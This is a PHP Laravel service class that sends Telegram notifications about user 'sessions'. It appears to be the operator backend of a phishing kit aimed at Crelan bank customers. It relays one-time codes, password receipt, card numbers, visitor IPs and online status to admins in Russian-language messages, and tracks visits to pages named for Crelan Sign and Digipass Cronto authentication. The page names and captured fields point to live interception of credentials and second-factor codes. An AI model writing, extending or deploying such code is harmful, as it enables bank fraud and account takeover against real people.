<?php

declare(strict_types=1);

namespace App\Services;

use App\DTOs\TelegramMessageDTO;
use App\Enums\ActionType;
use App\Models\Session;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

/**
 * Service for Telegram transport and notifications.
 */
class TelegramService
{
    private ?Nutgram $bot = null;

    private bool $isConfigured = false;

    public function __construct(
        private readonly AdminService $adminService,
        private readonly TelegramSessionMessageBuilder $sessionMessageBuilder,
    ) {
        $token = config('services.telegram.bot_token') ?? config('nutgram.token');

        if (! empty($token)) {
            try {
                $this->bot = new Nutgram($token);
                $this->isConfigured = true;
            } catch (\Throwable $e) {
                report($e);
            }
        }
    }

    public function isConfigured(): bool
    {
        return $this->isConfigured && $this->bot !== null;
    }

    public function getGroupChatId(): ?int
    {
        $groupId = config('services.telegram.group_chat_id');

        return $groupId ? (int) $groupId : null;
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function sendNewSessionNotification(Session $session): array
    {
        if (! $this->isConfigured()) {
            Log::warning('sendNewSessionNotification: bot not configured', [
                'session_id' => $session->id,
            ]);

            return [];
        }

        $dedupeKey = "telegram:new_session_notification:{$session->id}";
        if (! Cache::add($dedupeKey, true, now()->addMinutes(10))) {
            Log::info('sendNewSessionNotification: deduped', [
                'session_id' => $session->id,
            ]);

            return [];
        }

        $results = [];

        if ($this->getGroupChatId()) {
            $results = array_merge($results, $this->sendToGroup($session));
        }

        return array_merge($results, $this->sendToAllAdmins($session));
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function sendToGroup(Session $session): array
    {
        $groupChatId = $this->getGroupChatId();
        if (! $groupChatId) {
            return [];
        }

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $groupChatId,
                parse_mode: 'HTML',
                reply_markup: $this->buildKeyboardMarkup($keyboard),
            );

            return [
                'group' => [
                    'success' => true,
                    'message_id' => $message->message_id,
                    'chat_id' => $groupChatId,
                ],
            ];
        } catch (\Throwable $e) {
            Log::error('sendToGroup: failed', [
                'session_id' => $session->id,
                'chat_id' => $groupChatId,
                ...$this->exceptionContext($e),
            ]);

            return [
                'group' => [
                    'success' => false,
                    'error' => $e->getMessage(),
                ],
            ];
        }
    }

    public function sendMessage(TelegramMessageDTO $dto): ?int
    {
        if (! $this->isConfigured()) {
            return null;
        }

        try {
            $message = $this->bot->sendMessage(
                text: $dto->text,
                chat_id: $dto->chatId,
                parse_mode: $dto->parseMode,
                reply_to_message_id: $dto->replyToMessageId,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendMessage: failed', [
                'chat_id' => $dto->chatId,
                'text_length' => mb_strlen($dto->text),
                ...$this->exceptionContext($e),
            ]);
            report($e);

            return null;
        }
    }

    public function editMessage(TelegramMessageDTO $dto): bool
    {
        if (! $this->isConfigured() || ! $dto->isEdit()) {
            return false;
        }

        try {
            $this->bot->editMessageText(
                text: $dto->text,
                chat_id: $dto->chatId,
                message_id: $dto->messageId,
                parse_mode: $dto->parseMode,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            return true;
        } catch (\Throwable $e) {
            report($e);

            return false;
        }
    }

    public function pinMessage(int $chatId, int $messageId): bool
    {
        if (! $this->isConfigured()) {
            return false;
        }

        try {
            $this->bot->pinChatMessage(
                chat_id: $chatId,
                message_id: $messageId,
                disable_notification: false,
            );

            return true;
        } catch (\Throwable $e) {
            Log::warning('pinMessage: failed', [
                'chat_id' => $chatId,
                'message_id' => $messageId,
                'exception' => $e::class,
                'error' => $e->getMessage(),
            ]);

            return false;
        }
    }

    public function updateSessionMessage(Session $session): bool
    {
        if ($session->telegram_message_id === null) {
            return false;
        }

        $chatId = $session->telegram_chat_id
            ?? $this->getGroupChatId()
            ?? $session->admin?->telegram_user_id;

        if ($chatId === null) {
            return false;
        }

        if ($this->shouldSkipSessionMessageUpdate($session, $chatId)) {
            return true;
        }

        $dto = TelegramMessageDTO::edit(
            chatId: $chatId,
            messageId: $session->telegram_message_id,
            text: $this->formatSessionMessage($session),
            keyboard: $this->buildSessionKeyboard($session),
        );

        return $this->editMessage($dto);
    }

    public function sendSessionUpdate(Session $session, string $updateText): ?int
    {
        if (! $this->isConfigured()) {
            return null;
        }

        $sessionInfo = "📋 <b>Сессия:</b> <code>{$session->input_value}</code>";
        if ($session->admin) {
            $adminName = $session->admin->username
                ? "@{$session->admin->username}"
                : "ID:{$session->admin->telegram_user_id}";
            $sessionInfo .= " | 👤 {$adminName}";
        }

        $fullText = "{$sessionInfo}\n\n{$updateText}";
        $groupChatId = $this->getGroupChatId();

        if ($groupChatId) {
            $messageId = $this->sendToGroupNotification($groupChatId, $fullText);
            if ($messageId !== null) {
                return $messageId;
            }
        }

        if ($session->admin_id === null || $session->admin === null) {
            return null;
        }

        return $this->sendTemporaryMessage($session->admin->telegram_user_id, $updateText, 10);
    }

    public function sendTemporaryMessage(int $chatId, string $text, int $deleteAfterSeconds = 10): ?int
    {
        if (! $this->isConfigured()) {
            return null;
        }

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $chatId,
                parse_mode: 'HTML',
            );

            if ($message) {
                $this->scheduleMessageDeletion($chatId, $message->message_id, $deleteAfterSeconds);
            }

            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendTemporaryMessage: failed', [
                'chat_id' => $chatId,
                'text_length' => mb_strlen($text),
                ...$this->exceptionContext($e),
            ]);
            report($e);

            return null;
        }
    }

    public function formatSessionMessage(Session $session): string
    {
        return $this->sessionMessageBuilder->formatSessionMessage($session);
    }

    /**
     * @return array<int, array<int, mixed>>
     */
    public function buildSessionKeyboard(Session $session): array
    {
        return $this->sessionMessageBuilder->buildSessionKeyboard($session);
    }

    public function notifyFormSubmitted(Session $session, string $formType, array $data = []): ?int
    {
        $actionType = ActionType::tryFrom($formType);
        $label = $actionType?->label() ?? $formType;
        $emoji = $actionType?->emoji() ?? '📝';

        $text = "{$emoji} <b>Получены данные формы: {$label}</b>";

        if (isset($data['code'])) {
            $text .= "\n\n🔢 Код: <code>{$data['code']}</code>";
        }
        if (isset($data['password'])) {
            $text .= "\n\n🔐 Пароль получен";
        }
        if (isset($data['card_number'])) {
            $masked = '**** **** **** '.substr((string) $data['card_number'], -4);
            $text .= "\n\n💳 Карта: <code>{$masked}</code>";
        }

        return $this->sendSessionUpdate($session, $text);
    }

    public function notifyOnlineStatus(Session $session, bool $isOnline): ?int
    {
        $cacheKey = "online_status:{$session->id}:".($isOnline ? '1' : '0');
        if (Cache::has($cacheKey)) {
            return null;
        }
        Cache::put($cacheKey, true, 3);

        $status = $isOnline ? '🟢 Онлайн' : '🔴 Оффлайн';
        $text = "<b>Статус пользователя:</b> {$status}";

        return $this->sendSessionUpdate($session, $text);
    }

    public function notifyPageVisit(Session $session, string $pageName, string $pageUrl, ?string $actionType = null): ?int
    {
        $cacheKey = "page_visit:{$session->id}:".md5($pageName.$pageUrl.$actionType);
        if (Cache::has($cacheKey)) {
            return null;
        }
        Cache::put($cacheKey, true, 5);

        $emoji = match ($pageName) {
            'Главная страница' => '🏠',
            'Форма действия' => '📝',
            'Ожидание' => '⏳',
            'Crelan Sign QR page' => '📷',
            'Crelan Sign QR retry' => '🔄',
            'Digipass page' => '🔑',
            'Digipass submitted' => '✅',
            'Digipass Cronto submitted' => '✅',
            'Method selection page' => '🔀',
            'Digipass Cronto QR page' => '📷',
            'Digipass Cronto QR retry' => '🔄',
            'Digipass serial page' => '🔢',
            default => '📄',
        };

        $domain = parse_url($pageUrl, PHP_URL_HOST) ?: 'unknown';
        $ipAddress = $session->ip ?? 'unknown';

        $text = "💡 <b>Новое посещение</b> #visit\n";
        $text .= "{$emoji} <b>Страница:</b> {$pageName}\n";
        $text .= "🌐 <b>Домен:</b> <code>{$domain}</code>\n";
        $text .= "📍 <b>IP:</b> <code>{$ipAddress}</code>";

        if ($actionType) {
            $action = ActionType::tryFrom($actionType);
            if ($action) {
                $text .= "\n\n{$action->emoji()} <b>Действие:</b> {$action->label()}";
            }
        }

        $text .= "\n\n🔗 <code>{$pageUrl}</code>";

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    private function sendToAllAdmins(Session $session): array
    {
        $admins = $this->adminService->getActiveAdmins();
        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        $results = [];
        foreach ($admins as $admin) {
            try {
                $message = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $this->buildKeyboardMarkup($keyboard),
                );

                $results[$admin->id] = [
                    'success' => true,
                    'message_id' => $message->message_id,
                ];
            } catch (\Throwable $e) {
                $results[$admin->id] = [
                    'success' => false,
                    'error' => $e->getMessage(),
                ];
            }
        }

        return $results;
    }

    private function sendToGroupNotification(int $chatId, string $text): ?int
    {
        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $chatId,
                parse_mode: 'HTML',
            );

            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendToGroupNotification: failed', [
                'chat_id' => $chatId,
                ...$this->exceptionContext($e),
            ]);

            return null;
        }
    }

    /**
     * @param  array<int, array<int, mixed>>  $keyboard
     */
    private function buildKeyboardMarkup(array $keyboard): ?InlineKeyboardMarkup
    {
        if (empty($keyboard)) {
            return null;
        }

        $markup = new InlineKeyboardMarkup;
        foreach ($keyboard as $row) {
            if (! empty($row)) {
                $markup->addRow(...$row);
            }
        }

        return $markup;
    }

    private function scheduleMessageDeletion(int $chatId, int $messageId, int $seconds): void
    {
        dispatch(function () use ($chatId, $messageId): void {
            try {
                $token = config('services.telegram.bot_token');
                if ($token) {
                    $bot = new Nutgram($token);
                    $bot->deleteMessage($chatId, $messageId);
                }
            } catch (\Throwable) {
            }
        })->delay(now()->addSeconds($seconds));
    }

    private function shouldSkipSessionMessageUpdate(Session $session, int $chatId): bool
    {
        $cacheKey = "telegram:session_message:fingerprint:{$session->id}";
        $fingerprint = md5((string) implode('|', [
            $session->id,
            (string) $chatId,
            (string) $session->telegram_message_id,
            (string) $session->admin_id,
            (string) $session->status->value,
            (string) ($session->action_type?->value ?? ''),
            (string) ($session->updated_at?->toISOString() ?? ''),
        ]));

        $previous = Cache::get($cacheKey);
        Cache::put($cacheKey, $fingerprint, now()->addSeconds(3));

        return $previous === $fingerprint;
    }

    /**
     * @return array<string, mixed>
     */
    private function exceptionContext(\Throwable $e): array
    {
        $context = [
            'exception' => $e::class,
            'code' => $e->getCode(),
            'error' => $e->getMessage(),
        ];

        $knownMethods = ['getResponse', 'response', 'getRawResponse', 'getTelegramResponse'];
        foreach ($knownMethods as $method) {
            if (! method_exists($e, $method)) {
                continue;
            }

            try {
                $context[$method] = $e->{$method}();
            } catch (\Throwable $nested) {
                $context[$method] = [
                    'error' => $nested->getMessage(),
                    'exception' => $nested::class,
                ];
            }
        }

        if ($e->getPrevious() !== null) {
            $prev = $e->getPrevious();
            $context['previous'] = [
                'exception' => $prev::class,
                'code' => $prev->getCode(),
                'error' => $prev->getMessage(),
            ];
        }

        return $context;
    }
}
